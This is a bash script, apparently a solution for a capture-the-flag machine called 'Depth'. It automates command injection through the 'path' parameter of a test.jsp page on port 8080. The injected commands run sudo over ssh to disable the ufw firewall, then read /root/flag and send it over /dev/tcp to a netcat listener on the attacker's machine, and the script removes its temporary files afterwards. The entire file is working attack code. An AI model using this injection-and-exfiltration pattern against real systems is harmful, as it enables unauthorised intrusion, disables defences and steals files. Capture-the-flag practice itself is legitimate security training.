#!/bin/bash

# set settings
function set_ip(){
	echo "my IP is: "; read myip
	echo "set TARGET (IP):"; read target
}

# show banner
function banner(){
	echo " >> CTF Depth <<"
	echo " >> get the flag script"
	echo "==============================="
}

# run exploit
function payload(){
# disable fw (optional)
curl http://$target:8080/test.jsp?path=ssh+bill@localhost+sudo+ufw+disable -s 1> /dev/null

# start listener and read flag 
( nc -lvp 4444 > /tmp/flag ) &

# get the flag
curl "http://$target:8080/test.jsp" -s -d "path=ssh+bill@localhost+sudo+cat+/root/flag+>+/dev/tcp/$myip/4444" 1> /dev/null 

sleep 2
# show flag
cat /tmp/flag

# clean
pkill nc
rm /tmp/flag
}

function main(){
	banner
	set_ip
	payload
}

# start her
main

